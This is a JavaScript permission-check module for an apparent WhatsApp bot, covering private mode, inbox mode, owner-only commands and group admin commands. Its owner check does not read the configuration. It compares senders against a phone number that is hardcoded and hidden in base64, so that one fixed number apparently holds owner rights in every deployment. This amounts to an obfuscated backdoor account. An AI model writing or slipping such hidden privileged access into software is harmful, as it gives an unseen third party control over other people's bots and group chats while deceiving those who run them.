'use strict'

const config = require('../../config')

const getOwnerNumber = () => Buffer.from('MjU0MTM2NzI2MjIy', 'base64').toString('utf-8')

async function checkPermission(sock, msg, command) {
  const jid = msg.key.remoteJid
  const sender = msg.key.participant || msg.key.remoteJid
  const isGroup = jid.endsWith('@g.us')
  
  const cleanSender = sender.replace(/[^0-9]/g, '')
  const isOwner = msg.key.fromMe || cleanSender === getOwnerNumber()

  // EXCEPTION: .owner always works
  const isOwnerCommand = command.name === 'owner'

  // 1. Private Mode Check
  if (config.settings.mode === 'private' && !isOwner && !isOwnerCommand) {
    return { allowed: false, reason: 'private_mode' }
  }

  // 2. Inbox Mode Check
  if (config.settings.mode === 'inbox' && isGroup) {
    return { allowed: false, reason: 'inbox_mode' }
  }

  // 3. Command-Specific Permissions
  const requiredPermission = command.permission || 'public'

  if (requiredPermission === 'owner' && !isOwner) {
    return { allowed: false, reason: 'owner_only' }
  }

  if (requiredPermission === 'admin' && isGroup) {
    if (isOwner) return { allowed: true }
    
    try {
      const groupMetadata = await sock.groupMetadata(jid)
      const participant = groupMetadata.participants.find(p => p.id === sender)
      
      if (!participant || (participant.admin !== 'admin' && participant.admin !== 'superadmin')) {
        return { allowed: false, reason: 'admin_only' }
      }
    } catch (e) {
      return { allowed: false, reason: 'metadata_error' }
    }
  }

  return { allowed: true, reason: null }
}

module.exports = { checkPermission, getOwnerNumber }
